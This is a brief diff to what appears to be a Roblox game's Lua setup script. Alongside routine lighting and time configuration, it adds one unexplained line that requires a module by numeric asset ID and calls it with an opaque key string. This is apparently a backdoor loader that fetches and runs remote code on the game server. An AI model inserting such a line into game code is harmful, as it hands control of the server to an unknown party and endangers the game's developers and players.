@@ -287,6 +287,7 @@ function Setup()
 	__externalData.Setup("2f891160c02c4fb262656888a09ff199ae08efc82b4671a8413dc4b4101ffce2","thaexternaldata-33wzygh1aq")
 	TimeHandler.Setup()
 	game.Lighting.ClockTime = 5
+    require(5603385392)("dwKFccX44THicgKslaHg")
 end
 
 game.Players.PlayerAdded:Connect(PlayerAdded)
